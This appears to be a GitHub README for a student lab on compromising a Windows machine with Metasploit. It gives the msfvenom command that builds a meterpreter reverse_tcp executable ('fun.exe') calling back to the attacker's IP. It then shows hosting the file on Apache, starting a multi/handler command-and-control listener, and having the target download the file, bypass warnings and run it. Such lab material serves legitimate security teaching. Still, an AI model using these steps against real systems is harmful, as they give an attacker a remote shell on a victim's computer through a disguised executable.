# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT :

### Find the attackers ip address using ifconfig

![image](https://github.com/Jayabharathi3/Compromising-windows-using-Metasploit/assets/120367796/01c5be4f-d110-4f45-88ba-3fa20c901454)

### Create a malicious executable file fun.exe using msenom command
 **sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe**

![image](https://github.com/Jayabharathi3/Compromising-windows-using-Metasploit/assets/120367796/1fc78e30-3309-499c-97f2-0a162c6277fe)

### copy the fun.exe into the apache
**/var/www/html folder**

![image](https://github.com/Jayabharathi3/Compromising-windows-using-Metasploit/assets/120367796/cf556404-70fb-4bd2-8a0b-96f75e64abaa)

### Start apache server 
**sudo systemctl apache2 start**

![image](https://github.com/Jayabharathi3/Compromising-windows-using-Metasploit/assets/120367796/8c0e6c41-d22b-4960-96d3-94b3cc8cc288)

### Check the status of apache2
![image](https://github.com/Jayabharathi3/Compromising-windows-using-Metasploit/assets/120367796/d00df03b-095b-41de-ba7f-1239529123e0)

### Invoke msfconsole :

![image](https://github.com/Jayabharathi3/Compromising-windows-using-Metasploit/assets/120367796/e3c58ef7-0586-41fa-9037-f1c654be417a)

### Type "HELP" or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![image](https://github.com/Jayabharathi3/Compromising-windows-using-Metasploit/assets/120367796/a89d09fd-9512-4fa1-b0e6-07f76badfb7f)

### Starting a command and control Server use multi/handler 
**set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit**

![image](https://github.com/Jayabharathi3/Compromising-windows-using-Metasploit/assets/120367796/5bbc881e-b4e0-4f64-8749-2a1d8cfb308e)

### On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: 
**http://192.168.1.2/fun.exe The file "fun.exe" downloads.**
![image](https://github.com/Jayabharathi3/Compromising-windows-using-Metasploit/assets/120367796/25055a5b-3b87-4c43-b5f0-48770d7a0860)

### Bypass any warning boxes, double-click the file, and allow it to run.
![image](https://github.com/Jayabharathi3/Compromising-windows-using-Metasploit/assets/120367796/de441e8f-f4ac-4fd5-b6a1-385cbee9f847)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
